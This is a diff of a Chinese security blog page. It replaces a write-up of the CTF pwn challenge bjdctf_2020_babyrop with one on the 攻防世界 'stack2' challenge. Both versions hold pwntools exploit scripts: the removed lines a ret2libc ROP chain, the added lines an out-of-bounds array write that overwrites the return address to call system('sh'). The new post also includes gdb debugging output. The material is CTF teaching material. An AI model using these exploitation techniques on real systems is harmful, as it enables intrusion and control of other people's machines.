@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bjdctf_2020_babyrop | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" ROP ">
-  <meta name="description" content="bjdctf_2020_babyrop | sixpar&#39;s blog">
+  <title>攻防世界pwn进阶题-stack2 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" ROP , 数组溢出 ">
+  <meta name="description" content="攻防世界pwn进阶题-stack2 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -644,9 +644,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bjdctf-2020-babyrop" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-攻防世界pwn进阶题-stack2" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bjdctf_2020_babyrop</h1>
+        <h1 class="article-title">攻防世界pwn进阶题-stack2</h1>
     
     <div class="article-meta">
         
@@ -666,17 +666,19 @@
             
             <a class="color4">ROP</a>
             
+            <a class="color5">数组溢出</a>
+            
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 13:06:14'>2020-07-03 12:40</time>
+            Created At : <time class="date" title='Updated At: 2020-07-19 09:27:57'>2020-07-19 09:26</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:233</span>
+        <span>Count:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -706,7 +708,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（64位）"><span class="toc-text">保护机制（64位）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试过程："><span class="toc-text">调试过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#先确认数组的首地址："><span class="toc-text">先确认数组的首地址：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定main函数的返回地址："><span class="toc-text">确定main函数的返回地址：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -722,35 +724,86 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这题算是比较经典的rop题目吧。Mark</p>
-<h2 id="保护机制（64位）"><a href="#保护机制（64位）" class="headerlink" title="保护机制（64位）"></a>保护机制（64位）</h2><blockquote>
-<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
+        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)</code></pre><h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>程序的第三个功能处：</p>
+<pre><code class="c">      puts(&quot;which number to change:&quot;);
+      __isoc99_scanf(&quot;%d&quot;, &amp;v5);
+      puts(&quot;new number:&quot;);
+      __isoc99_scanf(&quot;%d&quot;, &amp;v7);
+      v13[v5] = v7;</code></pre>
+<p>可以发现在对数组v13赋值时，程序并没有进行边界检查，也没有对v5这个变量进行审查。这代表着什么呢，这代表着我们可以修改数组以及数组后面的任何数据。我们可以利用栈溢出构造ROP，达到劫持程序的效果。</p>
+<p>在查找字符串的时候发现了一个后门函数：</p>
+<pre><code class="c">int hackhere()
+{
+  return system(&quot;/bin/bash&quot;);
+}</code></pre>
+<p>这个函数不能直接用，但是我们可以截取，使用其中的‘sh’，而在程序中也可以找到system函数的plt地址，故我们可以自己构造：</p>
+<blockquote>
+<p>system(‘sh’)</p>
 </blockquote>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>多亏了这个溢出，直接rop一波流。puts函数泄露puts地址，返回地址填main函数。通过puts地址计算system和binsh字符串的地址。再次构造rop链，通过rdi传参，system(“/bin/sh”)。</p>
-<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><pre><code class="python">from pwn import *
-# p=remote(&#39;node3.buuoj.cn&#39;,28703)
-p=process(&#39;./bjdctf_2020_babyrop&#39;)
-elf=ELF(&#39;./bjdctf_2020_babyrop&#39;)
-libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+<h2 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h2><h3 id="先确认数组的首地址："><a href="#先确认数组的首地址：" class="headerlink" title="先确认数组的首地址："></a>先确认数组的首地址：</h3><p>gdb ./s<br>b *0x080486D5 下断点<br>r运行起来<br>两次分别输入‘1’，‘1’，然后自动断在0x080486D5处<br>此时，EAX: 0xffffcf38<br>所以存储数组的首地址就为 0xffffcf38<br>我们验证一下：<br>查看0xffffcf38处内容：</p>
+<pre><code class="python">gdb-peda$ x/10xg 0xffffcf38
+0xffffcf38:    0x00000000000000e0    0xf7ffd918f7ffd000</code></pre>
+<p>然后ni执行0x080486D5语句：mov [eax],cl<br>然后再次查看0xffffcf38处内容：</p>
+<pre><code class="python">gdb-peda$ x/10xg 0xffffcf38
+0xffffcf38:    0x0000000000000001    0xf7ffd918f7ffd000</code></pre>
+<p>发现果然我们输入的‘1’存到了这个地址里。<br>以上调试得到的结果：0xffffcf38是数组首地址。</p>
+<h3 id="确定main函数的返回地址："><a href="#确定main函数的返回地址：" class="headerlink" title="确定main函数的返回地址："></a>确定main函数的返回地址：</h3><p>这个好办，只要执行到main函数的retn语句时，esp的值就是main函数的返回地址。<br>gdb ./s<br>b *0x80488f2<br>r运行<br>两次分别输入‘1’，‘1’，然后输入‘5’进行exit退出，断在retn处。</p>
+<p>得到此时的esp为 0xffffcfbc</p>
+<p>所以数组的大小为 0xffffcfbc - 0xffffcf38 = 0x84<br>所以我们要填充0x84字节的数据才能从输入点处溢出到main函数的返回地址。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><pre><code class="python">#-*-coding:utf-8-*-
+from pwn import *
+p = process(&#39;./s&#39;)
+#p = remote(&#39;111.198.29.45&#39;,35129)
 
-pop_rdi=0x400733
-puts_plt=elf.plt[&#39;puts&#39;]
-puts_got=elf.got[&#39;puts&#39;]
-main_addr=0x4006AD
+offest = 0x84 
+#单步往下走，到输入函数时我们输入1，查看栈情况.
+#通过动态调试，得eax为0xffffcf38
+#main函数返回时找到栈顶地址为0xffffcfdc，
+# 故偏移地址为hex(0xffffcfdc-0xffffcf58) = 0x84
+system_plt_addr = 0x08048450   #IDA查看
+sh_addr = 0x08048980+7 #/bin/bash字符串的基地址是0x08048980。而&#39;s&#39;位于这串字符串的第8个位置，所以基地址+7
 
-payload1=&#39;a&#39;*(0x20+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
-p.recvuntil(&#39;tell me u story!&#39;)
-p.sendline(payload1)
-p.recv()
-puts_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-print &quot;puts addr is :&quot;+hex(puts_addr)
-libc_base= puts_addr - libc.symbols[&#39;puts&#39;]
-system_addr=libc_base + libc.symbols[&#39;system&#39;]
-binsh_addr= libc_base+ libc.search(&quot;/bin/sh\x00&quot;).next()
+#利用代码v13[v5] = v7;来修改数组里的任意内容
+#而我们数组可以延伸到main函数返回地址，因而修改返回地址的内容
+def write_addr(offest,res):    # change content
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&quot;which number to change:&quot;) 
+    p.sendline(str(offest))
+    p.recvuntil(&quot;new number:&quot;)
+    p.sendline(str(res))
+    p.recvuntil(&quot;5. exit&quot;)
 
-payload2=&#39;a&#39;*(0x20+0x8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
-p.sendline(payload2)
+p.recvuntil(&quot;How many numbers you have:&quot;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&quot;Give me your numbers&quot;)
+p.sendline(&#39;2&#39;)
+p.recvuntil(&quot;5. exit&quot;)
+
+#从偏移0x84（返回地址）的位置开始写入system的plt地址 （0x08048450） ，且小端排序
+write_addr(offest,0x50)
+write_addr(offest+1,0x84)
+write_addr(offest+2,0x04)
+write_addr(offest+3,0x08)   #char类型，占一个字节，所以按一字节分割地址，倒序发送。
+
+
+#0x08048980+7 =0x08048987
+#写入字符‘sh’
+offest += 8    
+#解释一下这里为什么是+8
+# 0/1/2/3这四个偏移是存放system地址，然后4/5/6/7这四个偏移存放system的plt函数的返回地址（这里不管它是多少，反正随便），偏移8开始就是system的参数部分即‘sh’。
+write_addr(offest,0x87)
+write_addr(offest+1,0x89)
+write_addr(offest+2,0x04)
+write_addr(offest+3,0x08)
+
+p.sendline(&#39;5&#39;)
 p.interactive()</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>数组边界没有管控好，所以可以溢出，以修改数组内容的方式修改其他地址的内容。<br>通过调试获知数组的首地址以及main函数的返回地址，得知数组的偏移量，修改返回地址，构造ROP链。</p>
+<p>当然了，此题说是出题人搞错了，把/bin/sh搞成了/bin/bash，呃呃呃，要不然的话直接把返回地址改为后门函数就方便很多hhh。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
